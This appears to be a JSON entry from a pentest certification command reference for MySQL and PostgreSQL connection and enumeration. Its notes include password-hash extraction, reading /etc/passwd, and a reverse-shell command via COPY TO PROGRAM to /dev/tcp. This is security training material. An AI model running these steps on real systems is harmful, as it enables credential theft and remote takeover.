{
  "category": "exploitation",
  "description": "Database connection and enumeration commands",
  "commands": [
    {
      "id": "mysql-connect-basic",
      "name": "MySQL Database Connection",
      "category": "exploitation",
      "subcategory": "database",
      "command": "mysql -h <TARGET> -P <PORT> -u <USERNAME> -p'<PASSWORD>'",
      "description": "Connect to MySQL/MariaDB database with credentials for enumeration and data extraction",
      "tags": [
        "CREDENTIAL_ACCESS",
        "DATABASE",
        "ENUMERATION",
        "MYSQL"
      ],
      "variables": [
        {
          "name": "<TARGET>",
          "description": "MySQL server IP or hostname",
          "example": "192.168.45.100",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "MySQL port",
          "example": "3306",
          "required": false
        },
        {
          "name": "<USERNAME>",
          "description": "MySQL username",
          "example": "root",
          "required": true
        },
        {
          "name": "<PASSWORD>",
          "description": "MySQL password",
          "example": "password123",
          "required": true
        }
      ],
      "flag_explanations": {
        "-h": "MySQL server hostname or IP address",
        "-P": "Port number (uppercase P for port, default 3306)",
        "-u": "MySQL username for authentication",
        "-p": "Password (no space between -p and password to avoid prompt)"
      },
      "success_indicators": [
        "mysql>",
        "Welcome to the MySQL monitor",
        "MariaDB",
        "Server version:"
      ],
      "failure_indicators": [
        "Access denied",
        "ERROR 1045",
        "Can't connect to MySQL server",
        "ERROR 2003",
        "Unknown database"
      ],
      "next_steps": [],
      "alternatives": [
        "sqli-union-mysql-info"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "Access denied for user": "Wrong credentials or user lacks remote access. Check: SELECT user,host FROM mysql.user; (needs admin access)",
        "Can't connect to MySQL server": "Service down or port wrong. Verify: sudo nmap -p 3306 -Pn <TARGET>",
        "ERROR 1130: Host not allowed": "Your IP blocked by MySQL firewall. User may only allow localhost connections: GRANT ALL ON *.* TO '<USER>'@'%' IDENTIFIED BY '<PASS>';",
        "mysql command not found": "Install client: sudo apt install mysql-client or default-mysql-client"
      },
      "notes": "MySQL default port:\n3306.\n\nCheck information_schema for database structure.\n\nTime estimate:\n1-2 minutes.\n\ncertification tips:\n(1) Enumerate databases:\nSHOW DATABASES; (2) Look for:\nusers, admin, accounts, customers tables.\n\n(3) Common columns:\nusername, password, email, hash.\n\n(4) Extract hashes:\nSELECT user,password FROM mysql.user; (5) Check file read permissions:\nSELECT LOAD_FILE('/etc/passwd'); (6) UDF privilege escalation if admin:\nlinux-mysql-udf.\n\n(7) For scripting:\nmysql -h <TARGET> -u <USER> -p'<PASS>' -e 'SHOW DATABASES;'.\n\n(8) Common usernames:\nroot, admin, dbuser, webapp.",
      "methodology_guidance": {
        "after_success": "SHOW DATABASES; USE <database>; SHOW TABLES; SELECT * FROM users; SELECT user,password FROM mysql.user;"
      },
      "filled_example": "mysql -h 192.168.45.100 -P 3306 -u root -p'password123'"
    },
    {
      "id": "postgres-connect-basic",
      "name": "PostgreSQL Database Connection",
      "category": "exploitation",
      "subcategory": "database",
      "command": "psql -h <TARGET> -p <PORT> -U <USERNAME> -d <DATABASE>",
      "description": "Connect to PostgreSQL database with credentials for enumeration and potential code execution",
      "tags": [
        "CREDENTIAL_ACCESS",
        "DATABASE",
        "ENUMERATION",
        "POSTGRESQL"
      ],
      "variables": [
        {
          "name": "<TARGET>",
          "description": "PostgreSQL server IP or hostname",
          "example": "192.168.45.100",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "PostgreSQL port",
          "example": "5432",
          "required": false
        },
        {
          "name": "<USERNAME>",
          "description": "PostgreSQL username",
          "example": "postgres",
          "required": true
        },
        {
          "name": "<DATABASE>",
          "description": "Database name to connect to",
          "example": "postgres",
          "required": false
        }
      ],
      "flag_explanations": {
        "-h": "PostgreSQL server hostname or IP address",
        "-p": "Port number (lowercase p for port, default 5432)",
        "-U": "PostgreSQL username for authentication (uppercase U)",
        "-d": "Database name to connect to (default: same as username)"
      },
      "success_indicators": [
        "postgres=#",
        "postgres=>",
        "psql",
        "SSL connection",
        "You are now connected"
      ],
      "failure_indicators": [
        "password authentication failed",
        "FATAL: database",
        "could not connect to server",
        "Connection refused",
        "FATAL: no pg_hba.conf entry"
      ],
      "next_steps": [
        "postgres-privilege-check",
        "postgres-file-read"
      ],
      "alternatives": [
        "postgres-direct-connect",
        "sqli-union-postgresql-info"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "password authentication failed": "Wrong credentials. PostgreSQL is case-sensitive. Verify username/password from config files",
        "FATAL: database does not exist": "Specify database: -d postgres (common default) or omit -d flag",
        "could not connect to server": "Service down or port wrong. Verify: sudo nmap -p 5432 -Pn <TARGET>",
        "FATAL: no pg_hba.conf entry": "Your IP not whitelisted. Admin must add: host all all <YOUR_IP>/32 md5 to pg_hba.conf",
        "psql command not found": "Install client: sudo apt install postgresql-client"
      },
      "notes": "PostgreSQL default port:\n5432.\n\nDefault database:\npostgres.\n\nDefault superuser:\npostgres.\n\nTime estimate:\n1-2 minutes.\n\ncertification tips:\n(1) List databases:\n\\l or SELECT datname FROM pg_database; (2) Connect to database:\n\\c <db> (3) List tables:\n\\dt or SELECT tablename FROM pg_tables WHERE schemaname='public'; (4) Check if superuser:\nSELECT current_user, usesuperuser FROM pg_user WHERE usename=current_user; (5) File read (if superuser):\npostgres-file-read.\n\n(6) Command execution (if superuser):\nCOPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"'; (7) For scripting:\nPGPASSWORD='<PASS>' psql -h <TARGET> -U <USER> -d postgres -c 'SELECT version();'",
      "methodology_guidance": {
        "after_success": "\\l (list databases) \\c <database> (connect to database) \\dt (list tables) SELECT * FROM users;"
      },
      "filled_example": "psql -h 192.168.45.100 -p 5432 -U postgres -d postgres"
    }
  ]
}